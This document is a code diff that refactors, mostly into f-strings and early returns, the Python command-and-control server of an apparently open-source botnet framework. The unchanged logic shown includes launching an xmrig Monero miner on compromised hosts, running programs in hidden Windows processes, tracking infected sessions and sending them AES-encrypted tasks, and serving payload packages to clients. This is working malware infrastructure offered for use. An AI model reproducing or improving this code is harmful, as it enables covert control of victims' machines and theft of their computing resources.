@@ -187,7 +187,7 @@ class C2(threading.Thread):
             self.child_procs['dev_miner_py'] = Miner(url=url, port=host_port, user=user)
             self.child_procs['dev_miner_py'].start()
         except Exception as e:
-            print("{} error: {}".format(self._init_dev_miner.__name__, str(e)))
+            print(f"{self._init_dev_miner.__name__} error: {str(e)}")
 
             # if that fails, try downloading and running xmrig
             try:
@@ -195,15 +195,13 @@ class C2(threading.Thread):
                 threads = multiprocessing.cpu_count()
 
                 # find correct executable for this platform
-                if sys.platform == 'linux':
-                    platform = 'linux2'
-                else:
-                    platform = sys.platform
-
-                xmrig_path = os.path.abspath('buildyourownbotnet/modules/xmrig/xmrig_' + platform)
+                platform = 'linux2' if sys.platform == 'linux' else sys.platform
+                xmrig_path = os.path.abspath(
+                    f'buildyourownbotnet/modules/xmrig/xmrig_{platform}'
+                )
 
                 if sys.platform == 'win32':
-                    os.rename(xmrig_path, xmrig_path + '.exe')
+                    os.rename(xmrig_path, f'{xmrig_path}.exe')
 
                 os.chmod(xmrig_path, 755)
 
@@ -211,29 +209,28 @@ class C2(threading.Thread):
                 params = xmrig_path + " --url={url}:{host_port} --user={user} --coin=monero --donate-level=1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 --threads={threads}".format(url=url, host_port=host_port, user=user, threads=threads)
                 result = self._execute(params)
             except Exception as e:
-                print("{} error: {}".format(self._init_dev_miner.__name__, str(e)))
+                print(f"{self._init_dev_miner.__name__} error: {str(e)}")
 
 
     def _execute(self, args):
         # ugly method that should be refactored at some point
         path, args = [i.strip() for i in args.split('"') if i if not i.isspace()] if args.count('"') == 2 else [i for i in args.partition(' ') if i if not i.isspace()]
         args = [path] + args.split()
-        if os.path.isfile(path):
-            name = os.path.splitext(os.path.basename(path))[0]
+        if not os.path.isfile(path):
+            return f"File '{str(path)}' not found"
+        name = os.path.splitext(os.path.basename(path))[0]
+        try:
+            info = subprocess.STARTUPINFO()
+            info.dwFlags = subprocess.STARTF_USESHOWWINDOW ,  subprocess.CREATE_NEW_ps_GROUP
+            info.wShowWindow = subprocess.SW_HIDE
+            self.child_procs[name] = subprocess.Popen(args, startupinfo=info)
+            return f"Running '{path}' in a hidden process"
+        except Exception as e:
             try:
-                info = subprocess.STARTUPINFO()
-                info.dwFlags = subprocess.STARTF_USESHOWWINDOW ,  subprocess.CREATE_NEW_ps_GROUP
-                info.wShowWindow = subprocess.SW_HIDE
-                self.child_procs[name] = subprocess.Popen(args, startupinfo=info)
-                return "Running '{}' in a hidden process".format(path)
+                self.child_procs[name] = subprocess.Popen(args, 0, None, None, subprocess.PIPE, subprocess.PIPE)
+                return f"Running '{name}' in a new process"
             except Exception as e:
-                try:
-                    self.child_procs[name] = subprocess.Popen(args, 0, None, None, subprocess.PIPE, subprocess.PIPE)
-                    return "Running '{}' in a new process".format(name)
-                except Exception as e:
-                    util.log("{} error: {}".format(self._execute.__name__, str(e)))
-        else:
-            return "File '{}' not found".format(str(path))
+                util.log(f"{self._execute.__name__} error: {str(e)}")
 
 
     def py_exec(self, code):
@@ -305,7 +302,11 @@ class C2(threading.Thread):
 
         # forcibly end process
         globals()['__abort'] = True
-        _ = os.popen("taskkill /pid {} /f".format(os.getpid()) if os.name == 'nt' else "kill {}".format(os.getpid())).read()
+        _ = os.popen(
+            f"taskkill /pid {os.getpid()} /f"
+            if os.name == 'nt'
+            else f"kill {os.getpid()}"
+        ).read()
         util.display('Exiting...')
         sys.exit(0)
 
@@ -318,7 +319,12 @@ class C2(threading.Thread):
 
             session = SessionThread(connection=connection)
 
-            if session.info != None:
+            if session.info is None:
+                # util.display("\n\n[-]", color='red', style='bright', end=' ')
+                util.display("Failed Connection:", color='white', style='bright', end=' ')
+                util.display(address[0], color='white', style='normal')
+
+            else:
 
                 # database stores identifying information about session
                 session_dict = database.handle_session(session.info)
@@ -335,12 +341,7 @@ class C2(threading.Thread):
 
                 self.sessions[owner][session.info.get('uid')] = session
 
-                util.display('New session {}:{} connected'.format(owner, session.info.get('uid')))
-
-            else:
-                # util.display("\n\n[-]", color='red', style='bright', end=' ')
-                util.display("Failed Connection:", color='white', style='bright', end=' ')
-                util.display(address[0], color='white', style='normal')
+                util.display(f"New session {owner}:{session.info.get('uid')} connected")
 
             abort = globals()['__abort']
             if abort:
@@ -357,7 +358,16 @@ class C2(threading.Thread):
         while True:
             time.sleep(3)
             globals()['package_handler'].terminate()
-            globals()['package_handler'] = subprocess.Popen('{} -m {} {}'.format(sys.executable, http_serv_mod, port + 2), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, cwd=globals()['packages'], shell=True)
+            globals()['package_handler'] = subprocess.Popen(
+                f'{sys.executable} -m {http_serv_mod} {port + 2}',
+                0,
+                None,
+                subprocess.PIPE,
+                subprocess.PIPE,
+                subprocess.PIPE,
+                cwd=globals()['packages'],
+                shell=True,
+            )
 
 
     def run(self):
@@ -366,7 +376,9 @@ class C2(threading.Thread):
 
         """
         if self.debug:
-            util.display('parent={} , child={} , args={}'.format(inspect.stack()[1][3], inspect.stack()[0][3], locals()))
+            util.display(
+                f'parent={inspect.stack()[1][3]} , child={inspect.stack()[0][3]} , args={locals()}'
+            )
         if 'c2' not in globals()['__threads']:
             globals()['__threads']['c2'] = self.serve_until_stopped()
 
@@ -424,7 +436,7 @@ class SessionThread(threading.Thread):
             self.info = self.client_info()
             self.info['id'] = self.id
         except Exception as e:
-            util.log("Error creating session: {}".format(str(e)))
+            util.log(f"Error creating session: {str(e)}")
             self.info = None
 
 
@@ -457,9 +469,9 @@ class SessionThread(threading.Thread):
 
             _ = owner_sessions.pop(session_uid, None)
 
-            util.display('Session {}:{} disconnected'.format(owner, session_uid))
+            util.display(f'Session {owner}:{session_uid} disconnected')
         else:
-            util.display('Session {}:{} is already offline.'.format(owner, session_uid))
+            util.display(f'Session {owner}:{session_uid} is already offline.')
 
 
     def client_info(self):
@@ -498,7 +510,7 @@ class SessionThread(threading.Thread):
         """
         if not isinstance(task, dict):
             raise TypeError('task must be a dictionary object')
-        if not 'session' in task:
+        if 'session' not in task:
             task['session'] = self.id
         data = security.encrypt_aes(json.dumps(task), self.key)
         msg  = struct.pack('!L', len(data)) + data
@@ -522,25 +534,24 @@ class SessionThread(threading.Thread):
 
         header_size = struct.calcsize('!L')
         header = self.connection.recv(header_size)
-        if len(header) == 4:
-            msg_size = struct.unpack('!L', header)[0]
-            msg = self.connection.recv(8192)
-            try:
-                data = security.decrypt_aes(msg, self.key)
-                return json.loads(data)
-            except Exception as e:
-                util.log("{0} error: {1}".format(self.recv_task.__name__, str(e)))
-                return {
-                    "uid": uuid.uuid4().hex,
-                    "session": self.info.get('uid'), 
-                    "task": "", 
-                    "result": "Error: client returned invalid response", 
-                    "issued": datetime.utcnow().__str__(),
-                    "completed": ""
-                }
-        else:
+        if len(header) != 4:
             # empty header; peer down, scan or recon. Drop.
             return 0
+        msg_size = struct.unpack('!L', header)[0]
+        msg = self.connection.recv(8192)
+        try:
+            data = security.decrypt_aes(msg, self.key)
+            return json.loads(data)
+        except Exception as e:
+            util.log("{0} error: {1}".format(self.recv_task.__name__, str(e)))
+            return {
+                "uid": uuid.uuid4().hex,
+                "session": self.info.get('uid'), 
+                "task": "", 
+                "result": "Error: client returned invalid response", 
+                "issued": datetime.utcnow().__str__(),
+                "completed": ""
+            }
 
 if __name__ == '__main__':
     main()
